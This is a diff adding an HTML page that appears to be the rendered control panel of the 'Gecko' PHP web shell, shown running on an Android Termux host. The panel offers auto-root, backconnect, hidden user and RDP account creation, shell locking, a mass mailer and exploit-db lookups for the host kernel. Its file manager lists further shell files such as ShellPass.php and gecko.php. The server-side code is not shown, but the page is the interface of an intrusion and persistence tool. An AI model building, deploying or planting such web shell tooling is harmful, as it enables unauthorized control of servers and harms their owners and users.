@@ -1,0 +1,662 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Aktivis Coding [  ]</title>
+    <script src='https://kit.fontawesome.com/057b9b510c.js' crossorigin='anonymous'></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
+    <script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <style>
+        .btn-submit,
+        a {
+            text-decoration: none;
+            color: #fff
+        }
+
+        a,
+        body {
+            color: #fff
+        }
+
+        .btn-submit,
+        .form-file,
+        tbody tr:nth-child(2n) {
+            background-color: #22242d
+        }
+
+        .code-editor,
+        .modal,
+        .terminal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0
+        }
+
+        .code-editor-body textarea,
+        .terminal-body textarea {
+            width: 98.5%;
+            height: 400px;
+            font-size: smaller;
+            resize: none
+        }
+
+        .menu-tools li,
+        .terminal-body li,
+        .terminal-head li {
+            display: inline-block
+        }
+
+        body {
+            background-color: #0e0f17;
+            font-family: monospace
+        }
+
+        .btn-modal-close:hover,
+        .btn-submit:hover,
+        .menu-file-manager ul,
+        .path-pwd,
+        thead {
+            background-color: #2e313d
+        }
+
+        ul {
+            list-style: none
+        }
+
+        .menu-header li {
+            padding: 5px 0
+        }
+
+        .menu-header ul li {
+            font-weight: 700;
+            font-style: italic
+        }
+
+        .btn-submit {
+            padding: 7px 25px;
+            border: 2px solid grey;
+            border-radius: 4px
+        }
+
+        .form-file,
+        a:hover {
+            color: #c5c8d6
+        }
+
+        .btn-submit:hover {
+            border: 2px solid #c5c8d6
+        }
+
+        .form-upload {
+            margin: 10px 0
+        }
+
+        .form-file {
+            border: 2px solid grey;
+            padding: 7px 20px;
+            border-radius: 4px
+        }
+
+        .menu-tools {
+            width: 95%
+        }
+
+        .menu-tools li {
+            margin: 15px 0
+        }
+
+        .menu-file-manager,
+        .modal-mail-text {
+            margin: 10px 40px
+        }
+
+        .menu-file-manager li {
+            display: inline-block;
+            margin: 15px 20px
+        }
+
+        .menu-file-manager li a::after {
+            content: "";
+            display: block;
+            border-bottom: 1px solid #fff
+        }
+
+        .path-pwd {
+            padding: 15px 0;
+            margin: 5px 0
+        }
+
+        table {
+            border-radius: 5px
+        }
+
+        thead {
+            height: 35px
+        }
+
+        tbody tr td {
+            padding: 10px 0
+        }
+
+        tbody tr td:nth-child(2),
+        tbody tr td:nth-child(3),
+        tbody tr td:nth-child(4) {
+            text-align: center
+        }
+
+        ::-webkit-scrollbar {
+            width: 16px
+        }
+
+        ::-webkit-scrollbar-track {
+            background: #0e0f17
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: #22242d;
+            border: 2px solid #555;
+            border-radius: 4px
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: #555
+        }
+
+        ::-webkit-file-upload-button {
+            display: none
+        }
+
+        .modal {
+            display: none;
+            z-index: 2;
+            width: 100%;
+            background-color: rgba(0, 0, 0, .3)
+        }
+
+        .modal-container {
+            animation-name: modal-pop-out;
+            animation-duration: .7s;
+            animation-fill-mode: both;
+            margin: 10% auto auto;
+            border-radius: 10px;
+            width: 800px;
+            background-color: #f4f4f9
+        }
+
+        @keyframes modal-pop-out {
+            from {
+                opacity: 0
+            }
+
+            to {
+                opacity: 1
+            }
+        }
+
+        .modal-header {
+            color: #000;
+            margin-left: 30px;
+            padding: 10px
+        }
+
+        .modal-body,
+        .terminal-head li {
+            color: #000
+        }
+
+        .modal-create-input {
+            width: 700px;
+            padding: 10px 5px;
+            background-color: #f4f4f9;
+            margin: 0 5%;
+            border: none;
+            border-radius: 4px;
+            box-shadow: 8px 8px 20px rgba(0, 0, 0, .2);
+            border-bottom: 2px solid #0e0f17
+        }
+
+        .box-shadow {
+            box-shadow: 8px 8px 8px rgba(0, 0, 0, .2)
+        }
+
+        .btn-modal-close {
+            background-color: #22242d;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            padding: 8px 35px
+        }
+
+        .badge-action-chmod:hover::after,
+        .badge-action-download:hover::after,
+        .badge-action-editor:hover::after {
+            padding: 5px;
+            border-radius: 5px;
+            margin-left: 110px;
+            background-color: #2e313d
+        }
+
+        .modal-btn-form {
+            margin: 15px 0;
+            padding: 10px;
+            text-align: right
+        }
+
+        .file-size {
+            color: orange
+        }
+
+        .badge-root::after {
+            content: "root";
+            display: block;
+            position: absolute;
+            width: 40px;
+            text-align: center;
+            margin-top: -30px;
+            margin-left: 110px;
+            border-radius: 4px;
+            background-color: red
+        }
+
+        .badge-action-chmod:hover::after,
+        .badge-action-download:hover::after,
+        .badge-action-editor:hover::after,
+        .badge-linux::after,
+        .badge-windows::after {
+            width: 60px;
+            text-align: center;
+            margin-top: -30px;
+            display: block;
+            position: absolute
+        }
+
+        .badge-windows::after {
+            background-color: orange;
+            color: #000;
+            margin-left: 100px;
+            border-radius: 4px;
+            content: "windows"
+        }
+
+        .badge-linux::after {
+            margin-left: 100px;
+            border-radius: 4px;
+            background-color: #0047a3;
+            content: "linux"
+        }
+
+        .badge-action-editor:hover::after {
+            content: "Rename"
+        }
+
+        .badge-action-chmod:hover::after {
+            content: "Chmod"
+        }
+
+        .badge-action-download:hover::after {
+            content: "Download"
+        }
+
+        .code-editor,
+        .terminal {
+            background-color: rgba(0, 0, 0, .3);
+            width: 100%
+        }
+
+        .code-editor-container {
+            background-color: #f4f4f9;
+            color: #000;
+            width: 95%;
+            margin: 40px auto auto;
+            border-radius: 10px
+        }
+
+        .code-editor-head {
+            padding: 15px;
+            font-weight: 700
+        }
+
+        .code-editor-body textarea {
+            border-radius: 4px;
+            margin: 0 4px;
+            background-color: #22242d;
+            color: #fff
+        }
+
+        .terminal-container {
+            animation: .5s both modal-pop-out;
+            width: 90%;
+            background-color: #f4f4f9;
+            margin: 25px auto auto;
+            color: #000;
+            border-radius: 4px
+        }
+
+        .bc-gecko,
+        .mail,
+        .terminal-input {
+            background-color: #22242d;
+            color: #fff
+        }
+
+        .terminal-head {
+            padding: 8px
+        }
+
+        .terminal-head li a {
+            color: #000;
+            position: absolute;
+            right: 0;
+            margin-right: 110px;
+            font-weight: 700;
+            margin-top: -20px;
+            font-size: 25px;
+            padding: 1px 10px
+        }
+
+        .terminal-body textarea {
+            margin: 4px;
+            background-color: #22242d;
+            color: #29db12;
+            border-radius: 4px
+        }
+
+        .active {
+            display: block
+        }
+
+        .terminal-input {
+            width: 500px;
+            padding: 6px;
+            border: 1px solid #22242d;
+            border-radius: 4px;
+            margin: 5px 0
+        }
+
+        .bc-gecko {
+            border: none;
+            padding: 7px 10px;
+            width: 712px;
+            border-radius: 5px;
+            margin: 15px 40px
+        }
+
+        .mail {
+            width: 705px;
+            resize: none;
+            height: 100px
+        }
+
+        .logo-gecko {
+            position: absolute;
+            top: -90px;
+            right: 40px;
+            z-index: -1;
+            bottom: 0
+        }
+    </style>
+</head>
+
+<body>
+    <div class="menu-header">
+        <ul>
+            <li><i class="fa-solid fa-computer"></i>&nbsp;Linux localhost 4.19.127-g93fef65a52-dirty #1 SMP PREEMPT Tue Sep 19 19:53:10 CST 2023 aarch64</li>
+            <li><i class="fa-solid fa-server"></i>&nbsp;</li>
+            <li><i class="fa-solid fa-network-wired"></i>&nbsp;:  |&nbsp;: </li>
+            <li><i class="fa-solid fa-globe"></i>&nbsp;<font color=red size=2px>Cant Read [ /etc/named.conf ]</font></li>
+            <li><i class="fa-brands fa-php"></i>&nbsp;8.2.8</li>
+            <li><i class="fa-solid fa-user"></i>&nbsp;u0_a261</li>
+            <li class="logo-gecko"><img width="400" height="400" src="https://raw.githubusercontent.com/MadExploits/Gecko/main/gecko1.png" align="right"></li>
+            <form action="" method="post" enctype='multipart/form-data'>
+                <li class="form-upload"><input type="submit" value="Upload" name="gecko-up-submit" class="btn-submit">&nbsp;<input type="file" name="gecko-upload" class="form-file"></li>
+            </form>
+        </ul>
+    </div>
+    <div class="menu-tools">
+        <ul>
+            <li><a href="?d=2f646174612f646174612f636f6d2e7465726d75782f66696c65732f686f6d652f4d696e695368656c6c&terminal=normal" class="btn-submit">Terminal</a></li>
+            <li><a href="?d=2f646174612f646174612f636f6d2e7465726d75782f66696c65732f686f6d652f4d696e695368656c6c&terminal=root" class="btn-submit badge-root">AUTO ROOT</a></li>
+            <li><a href="?d=2f646174612f646174612f636f6d2e7465726d75782f66696c65732f686f6d652f4d696e695368656c6c&adminer" class="btn-submit">Adminer</a></li>
+            <li><a href="?d=2f646174612f646174612f636f6d2e7465726d75782f66696c65732f686f6d652f4d696e695368656c6c&destroy" class="btn-submit">Backdoor Destroyer</a></li>
+            <li><a href="//www.exploit-db.com/search?q=Linux%20Kernel%204.19.127" class="btn-submit">Linux Exploit</a></li>
+            <li><a href="?d=2f646174612f646174612f636f6d2e7465726d75782f66696c65732f686f6d652f4d696e695368656c6c&lockshell" class="btn-submit">Lock Shell</a></li>
+            <li><a href="" class="btn-submit badge-linux" id="lock-file">Lock File</a></li>
+            <li><a href="" class="btn-submit badge-root" id="root-user">Create User</a></li>
+            <li><a href="" class="btn-submit" id="create-rdp">CREATE RDP</a></li>
+            <li><a href="?d=2f646174612f646174612f636f6d2e7465726d75782f66696c65732f686f6d652f4d696e695368656c6c&mailer" class="btn-submit">PHP Mailer</a></li>
+            <li><a href="?d=2f646174612f646174612f636f6d2e7465726d75782f66696c65732f686f6d652f4d696e695368656c6c&backconnect" class="btn-submit">BACKCONNECT</a></li>
+            <li><a href="//hashes.com/en/tools/hash_identifier" class="btn-submit">HASH IDENTIFIER</a></li>
+            <li><a href="//github.com/MadExploits/" class="btn-submit">README</a></li>
+        </ul>
+    </div>
+
+
+    <div class="menu-file-manager">
+        <ul>
+            <li><a href="" id="create_folder">+ Create Folder</a></li>
+            <li><a href="" id="create_file">+ Create File</a></li>
+        </ul>
+        <div class="path-pwd">
+            &nbsp;<a href="?d=2f"><i class="fa-solid fa-folder-plus"></i>&nbsp;/ </a><a href="?d=2f64617461">data / </a><a href="?d=2f646174612f64617461">data / </a><a href="?d=2f646174612f646174612f636f6d2e7465726d7578">com.termux / </a><a href="?d=2f646174612f646174612f636f6d2e7465726d75782f66696c6573">files / </a><a href="?d=2f646174612f646174612f636f6d2e7465726d75782f66696c65732f686f6d65">home / </a><a href="?d=2f646174612f646174612f636f6d2e7465726d75782f66696c65732f686f6d652f4d696e695368656c6c">MiniShell / </a><a style='font-weight:bold; color:orange;' href='?d=2f646174612f646174612f636f6d2e7465726d75782f66696c65732f686f6d652f4d696e695368656c6c'>[ HOME SHELL ]</a>&nbsp;        </div>
+        </ul>
+        <table style="width: 100%;">
+            <thead>
+                <tr>
+                    <th>Name</th>
+                    <th>Size</th>
+                    <th>Permission</th>
+                    <th>Action</th>
+                </tr>
+            </thead>
+            <form action="" method="post">
+                <tbody>
+                    <!-- Gecko Folder File Manager -->
+                                                                        <tr>
+                                <td><input type="checkbox" name="check[]" value=".git">&nbsp;<i class="fa-solid fa-folder-open" style="color:orange;"></i>&nbsp;<a href="?d=2f646174612f646174612f636f6d2e7465726d75782f66696c65732f686f6d652f4d696e695368656c6c2f2e676974">.git</a></td>
+                                <td>[ DIR ]</td>
+                                <td>
+                                    <font color="#00ff00">drwx------                                </td>
+                                <!-- Action Folder Manager -->
+                                <td><a href="?d=2f646174612f646174612f636f6d2e7465726d75782f66696c65732f686f6d652f4d696e695368656c6c&re=2e676974" class="badge-action-editor"><i class="fa-solid fa-pen-to-square"></i></a>&nbsp;<a href="?d=2f646174612f646174612f636f6d2e7465726d75782f66696c65732f686f6d652f4d696e695368656c6c&ch=2e676974" class="badge-action-chmod"><i class="fa-solid fa-user-pen"></i></a></td>
+                            </tr>
+
+
+
+
+
+
+
+
+
+
+
+
+                    <!-- Gecko Files Manager -->
+
+                                                                        <tr>
+                                <td><input type="checkbox" name="check[]" value="403.php">&nbsp;<i class="fa-solid fa-file-lines"></i>&nbsp;<a href="?d=2f646174612f646174612f636f6d2e7465726d75782f66696c65732f686f6d652f4d696e695368656c6c&f=3430332e706870" class="gecko-files">403.php</a></td>
+                                <td>75.28 <span class="file-size">KB</span></td>
+                                <td>
+                                    <font color="#00ff00">-rw-------                                </td>
+                                <!-- Action File Manager -->
+                                <td><a href="?d=2f646174612f646174612f636f6d2e7465726d75782f66696c65732f686f6d652f4d696e695368656c6c&re=3430332e706870" class="badge-action-editor"><i class="fa-solid fa-pen-to-square"></i></a>&nbsp;<a href="?d=2f646174612f646174612f636f6d2e7465726d75782f66696c65732f686f6d652f4d696e695368656c6c&ch=3430332e706870" class="badge-action-chmod"><i class="fa-solid fa-user-pen"></i></a>&nbsp;<a href="?d=2f646174612f646174612f636f6d2e7465726d75782f66696c65732f686f6d652f4d696e695368656c6c&don=3430332e706870" class="badge-action-download"><i class="fa-solid fa-download"></i></a></td>
+                            </tr>
+
+                                                                        <tr>
+                                <td><input type="checkbox" name="check[]" value="README.md">&nbsp;<i class="fa-solid fa-file-lines"></i>&nbsp;<a href="?d=2f646174612f646174612f636f6d2e7465726d75782f66696c65732f686f6d652f4d696e695368656c6c&f=524541444d452e6d64" class="gecko-files">README.md</a></td>
+                                <td>260 <span class="file-size">B</span></td>
+                                <td>
+                                    <font color="#00ff00">-rw-------                                </td>
+                                <!-- Action File Manager -->
+                                <td><a href="?d=2f646174612f646174612f636f6d2e7465726d75782f66696c65732f686f6d652f4d696e695368656c6c&re=524541444d452e6d64" class="badge-action-editor"><i class="fa-solid fa-pen-to-square"></i></a>&nbsp;<a href="?d=2f646174612f646174612f636f6d2e7465726d75782f66696c65732f686f6d652f4d696e695368656c6c&ch=524541444d452e6d64" class="badge-action-chmod"><i class="fa-solid fa-user-pen"></i></a>&nbsp;<a href="?d=2f646174612f646174612f636f6d2e7465726d75782f66696c65732f686f6d652f4d696e695368656c6c&don=524541444d452e6d64" class="badge-action-download"><i class="fa-solid fa-download"></i></a></td>
+                            </tr>
+
+                                                                        <tr>
+                                <td><input type="checkbox" name="check[]" value="ShellNoPass.php">&nbsp;<i class="fa-solid fa-file-lines"></i>&nbsp;<a href="?d=2f646174612f646174612f636f6d2e7465726d75782f66696c65732f686f6d652f4d696e695368656c6c&f=5368656c6c4e6f506173732e706870" class="gecko-files">ShellNoPass.php</a></td>
+                                <td>14.65 <span class="file-size">KB</span></td>
+                                <td>
+                                    <font color="#00ff00">-rw-------                                </td>
+                                <!-- Action File Manager -->
+                                <td><a href="?d=2f646174612f646174612f636f6d2e7465726d75782f66696c65732f686f6d652f4d696e695368656c6c&re=5368656c6c4e6f506173732e706870" class="badge-action-editor"><i class="fa-solid fa-pen-to-square"></i></a>&nbsp;<a href="?d=2f646174612f646174612f636f6d2e7465726d75782f66696c65732f686f6d652f4d696e695368656c6c&ch=5368656c6c4e6f506173732e706870" class="badge-action-chmod"><i class="fa-solid fa-user-pen"></i></a>&nbsp;<a href="?d=2f646174612f646174612f636f6d2e7465726d75782f66696c65732f686f6d652f4d696e695368656c6c&don=5368656c6c4e6f506173732e706870" class="badge-action-download"><i class="fa-solid fa-download"></i></a></td>
+                            </tr>
+
+                                                                        <tr>
+                                <td><input type="checkbox" name="check[]" value="ShellPass.php">&nbsp;<i class="fa-solid fa-file-lines"></i>&nbsp;<a href="?d=2f646174612f646174612f636f6d2e7465726d75782f66696c65732f686f6d652f4d696e695368656c6c&f=5368656c6c506173732e706870" class="gecko-files">ShellPass.php</a></td>
+                                <td>47.05 <span class="file-size">KB</span></td>
+                                <td>
+                                    <font color="#00ff00">-rw-------                                </td>
+                                <!-- Action File Manager -->
+                                <td><a href="?d=2f646174612f646174612f636f6d2e7465726d75782f66696c65732f686f6d652f4d696e695368656c6c&re=5368656c6c506173732e706870" class="badge-action-editor"><i class="fa-solid fa-pen-to-square"></i></a>&nbsp;<a href="?d=2f646174612f646174612f636f6d2e7465726d75782f66696c65732f686f6d652f4d696e695368656c6c&ch=5368656c6c506173732e706870" class="badge-action-chmod"><i class="fa-solid fa-user-pen"></i></a>&nbsp;<a href="?d=2f646174612f646174612f636f6d2e7465726d75782f66696c65732f686f6d652f4d696e695368656c6c&don=5368656c6c506173732e706870" class="badge-action-download"><i class="fa-solid fa-download"></i></a></td>
+                            </tr>
+
+                                                                        <tr>
+                                <td><input type="checkbox" name="check[]" value="Shell_1kb.php">&nbsp;<i class="fa-solid fa-file-lines"></i>&nbsp;<a href="?d=2f646174612f646174612f636f6d2e7465726d75782f66696c65732f686f6d652f4d696e695368656c6c&f=5368656c6c5f316b622e706870" class="gecko-files">Shell_1kb.php</a></td>
+                                <td>176 <span class="file-size">B</span></td>
+                                <td>
+                                    <font color="#00ff00">-rw-------                                </td>
+                                <!-- Action File Manager -->
+                                <td><a href="?d=2f646174612f646174612f636f6d2e7465726d75782f66696c65732f686f6d652f4d696e695368656c6c&re=5368656c6c5f316b622e706870" class="badge-action-editor"><i class="fa-solid fa-pen-to-square"></i></a>&nbsp;<a href="?d=2f646174612f646174612f636f6d2e7465726d75782f66696c65732f686f6d652f4d696e695368656c6c&ch=5368656c6c5f316b622e706870" class="badge-action-chmod"><i class="fa-solid fa-user-pen"></i></a>&nbsp;<a href="?d=2f646174612f646174612f636f6d2e7465726d75782f66696c65732f686f6d652f4d696e695368656c6c&don=5368656c6c5f316b622e706870" class="badge-action-download"><i class="fa-solid fa-download"></i></a></td>
+                            </tr>
+
+                                                                        <tr>
+                                <td><input type="checkbox" name="check[]" value="gecko.php">&nbsp;<i class="fa-solid fa-file-lines"></i>&nbsp;<a href="?d=2f646174612f646174612f636f6d2e7465726d75782f66696c65732f686f6d652f4d696e695368656c6c&f=6765636b6f2e706870" class="gecko-files">gecko.php</a></td>
+                                <td>145.63 <span class="file-size">KB</span></td>
+                                <td>
+                                    <font color="#00ff00">-rw-------                                </td>
+                                <!-- Action File Manager -->
+                                <td><a href="?d=2f646174612f646174612f636f6d2e7465726d75782f66696c65732f686f6d652f4d696e695368656c6c&re=6765636b6f2e706870" class="badge-action-editor"><i class="fa-solid fa-pen-to-square"></i></a>&nbsp;<a href="?d=2f646174612f646174612f636f6d2e7465726d75782f66696c65732f686f6d652f4d696e695368656c6c&ch=6765636b6f2e706870" class="badge-action-chmod"><i class="fa-solid fa-user-pen"></i></a>&nbsp;<a href="?d=2f646174612f646174612f636f6d2e7465726d75782f66696c65732f686f6d652f4d696e695368656c6c&don=6765636b6f2e706870" class="badge-action-download"><i class="fa-solid fa-download"></i></a></td>
+                            </tr>
+
+                                                                        <tr>
+                                <td><input type="checkbox" name="check[]" value="masse.php">&nbsp;<i class="fa-solid fa-file-lines"></i>&nbsp;<a href="?d=2f646174612f646174612f636f6d2e7465726d75782f66696c65732f686f6d652f4d696e695368656c6c&f=6d617373652e706870" class="gecko-files">masse.php</a></td>
+                                <td>899 <span class="file-size">B</span></td>
+                                <td>
+                                    <font color="#00ff00">-rw-------                                </td>
+                                <!-- Action File Manager -->
+                                <td><a href="?d=2f646174612f646174612f636f6d2e7465726d75782f66696c65732f686f6d652f4d696e695368656c6c&re=6d617373652e706870" class="badge-action-editor"><i class="fa-solid fa-pen-to-square"></i></a>&nbsp;<a href="?d=2f646174612f646174612f636f6d2e7465726d75782f66696c65732f686f6d652f4d696e695368656c6c&ch=6d617373652e706870" class="badge-action-chmod"><i class="fa-solid fa-user-pen"></i></a>&nbsp;<a href="?d=2f646174612f646174612f636f6d2e7465726d75782f66696c65732f686f6d652f4d696e695368656c6c&don=6d617373652e706870" class="badge-action-download"><i class="fa-solid fa-download"></i></a></td>
+                            </tr>
+
+                                                                        <tr>
+                                <td><input type="checkbox" name="check[]" value="pas.php">&nbsp;<i class="fa-solid fa-file-lines"></i>&nbsp;<a href="?d=2f646174612f646174612f636f6d2e7465726d75782f66696c65732f686f6d652f4d696e695368656c6c&f=7061732e706870" class="gecko-files">pas.php</a></td>
+                                <td>375 <span class="file-size">B</span></td>
+                                <td>
+                                    <font color="#00ff00">-rw-------                                </td>
+                                <!-- Action File Manager -->
+                                <td><a href="?d=2f646174612f646174612f636f6d2e7465726d75782f66696c65732f686f6d652f4d696e695368656c6c&re=7061732e706870" class="badge-action-editor"><i class="fa-solid fa-pen-to-square"></i></a>&nbsp;<a href="?d=2f646174612f646174612f636f6d2e7465726d75782f66696c65732f686f6d652f4d696e695368656c6c&ch=7061732e706870" class="badge-action-chmod"><i class="fa-solid fa-user-pen"></i></a>&nbsp;<a href="?d=2f646174612f646174612f636f6d2e7465726d75782f66696c65732f686f6d652f4d696e695368656c6c&don=7061732e706870" class="badge-action-download"><i class="fa-solid fa-download"></i></a></td>
+                            </tr>
+
+                                                                        <tr>
+                                <td><input type="checkbox" name="check[]" value="rct.jpg">&nbsp;<i class="fa-solid fa-file-lines"></i>&nbsp;<a href="?d=2f646174612f646174612f636f6d2e7465726d75782f66696c65732f686f6d652f4d696e695368656c6c&f=7263742e6a7067" class="gecko-files">rct.jpg</a></td>
+                                <td>48.11 <span class="file-size">KB</span></td>
+                                <td>
+                                    <font color="#00ff00">-rw-------                                </td>
+                                <!-- Action File Manager -->
+                                <td><a href="?d=2f646174612f646174612f636f6d2e7465726d75782f66696c65732f686f6d652f4d696e695368656c6c&re=7263742e6a7067" class="badge-action-editor"><i class="fa-solid fa-pen-to-square"></i></a>&nbsp;<a href="?d=2f646174612f646174612f636f6d2e7465726d75782f66696c65732f686f6d652f4d696e695368656c6c&ch=7263742e6a7067" class="badge-action-chmod"><i class="fa-solid fa-user-pen"></i></a>&nbsp;<a href="?d=2f646174612f646174612f636f6d2e7465726d75782f66696c65732f686f6d652f4d696e695368656c6c&don=7263742e6a7067" class="badge-action-download"><i class="fa-solid fa-download"></i></a></td>
+                            </tr>
+
+                                                                        <tr>
+                                <td><input type="checkbox" name="check[]" value="ultra.php">&nbsp;<i class="fa-solid fa-file-lines"></i>&nbsp;<a href="?d=2f646174612f646174612f636f6d2e7465726d75782f66696c65732f686f6d652f4d696e695368656c6c&f=756c7472612e706870" class="gecko-files">ultra.php</a></td>
+                                <td>35.21 <span class="file-size">KB</span></td>
+                                <td>
+                                    <font color="#00ff00">-rw-------                                </td>
+                                <!-- Action File Manager -->
+                                <td><a href="?d=2f646174612f646174612f636f6d2e7465726d75782f66696c65732f686f6d652f4d696e695368656c6c&re=756c7472612e706870" class="badge-action-editor"><i class="fa-solid fa-pen-to-square"></i></a>&nbsp;<a href="?d=2f646174612f646174612f636f6d2e7465726d75782f66696c65732f686f6d652f4d696e695368656c6c&ch=756c7472612e706870" class="badge-action-chmod"><i class="fa-solid fa-user-pen"></i></a>&nbsp;<a href="?d=2f646174612f646174612f636f6d2e7465726d75782f66696c65732f686f6d652f4d696e695368656c6c&don=756c7472612e706870" class="badge-action-download"><i class="fa-solid fa-download"></i></a></td>
+                            </tr>
+
+
+                </tbody>
+        </table>
+        <br>
+        <select name="gecko-select" class="btn-submit">
+            <option value="delete">Delete</option>
+            <option value="unzip">Unzip</option>
+            <option value="zip">Zip</option><br>
+        </select>
+        <input type="submit" name="submit-action" value="Submit" class="btn-submit" style="padding: 8.3px 35px;">
+        </form>
+
+        <!-- Modal Pop Jquery Create Folder/File By ./MrMad -->
+        <div class="modal">
+            <div class="modal-container">
+                <div class="modal-header">
+                    <h3><b><i id="modal-title">${this.title}</i></b></h3>
+                </div>
+                <form action="" method="post">
+                    <div class="modal-body">
+                        <div id="modal-body-bc"></div>
+                        <span id="modal-input"></span>
+                        <div class="modal-btn-form">
+                            <input type="submit" name="submit" value="Submit" class="btn-modal-close box-shadow">&nbsp;<button class="btn-modal-close box-shadow" id="close-modal">Close</button>
+                        </div>
+                </form>
+            </div>
+        </div>
+    </div>
+    </div>
+
+
+
+
+
+
+
+    <script>
+        $(document).ready(function() {
+            $('#create_folder').click(function() {
+                $('.modal').show();
+                $('#modal-title').html('<i class="fa-solid fa-folder-plus"></i>&nbsp;Create Folder');
+                $('#modal-input').html('<input type="text" name="create_folder" class="modal-create-input" placeholder="Create Folder">');
+                event.preventDefault();
+            });
+            $('#create_file').click(function() {
+                $('.modal').show();
+                $('#modal-title').html('<i class="fa-solid fa-file-circle-plus"></i>&nbsp;Create File');
+                $('#modal-input').html('<input type="text" name="create_file" class="modal-create-input" placeholder="Create File">');
+                event.preventDefault();
+            });
+            $('#lock-file').click(function() {
+                $('.modal').show();
+                $('#modal-title').html('<i class="fa-solid fa-lock"></i>&nbsp;LOCK FILE');
+                $('#modal-input').html('<input type="text" name="lockfile" class="modal-create-input" placeholder="Your File Name">');
+                event.preventDefault();
+            });
+            $('#root-user').click(function() {
+                $('.modal').show();
+                $('#modal-title').html('<i class="fa-solid fa-user-plus"></i>&nbsp;ADD USER');
+                $('#modal-input').html('<input type="text" name="add-username" class="modal-create-input" placeholder="Username"><br><br><input type="text" name="add-password" class="modal-create-input" placeholder="Password">');
+                event.preventDefault();
+            });
+
+            $('#create-rdp').click(function() {
+                $('.modal').show();
+                $('#modal-title').html(':: CREATE RDP');
+                $('#modal-input').html('<input type="text" name="add-rdp" class="modal-create-input" placeholder="Username"><br><br><input type="text" name="add-rdp-pass" class="modal-create-input" placeholder="Password">');
+                event.preventDefault();
+            });
+
+            $('#close-modal').click(function() {
+                $('.modal').hide();
+                event.preventDefault();
+            });
+            $('#close-editor').click(function() {
+                $('.code-editor').hide();
+                event.preventDefault();
+            });
+
+            $('.close-terminal').click(function() {
+                $('.terminal').hide();
+                event.preventDefault();
+            });
+            $('.close-btn-s').click(function() {
+                $('.modal').hide();
+                event.preventDefault();
+            });
+        });
+    </script>
+</body>
+
+</html>
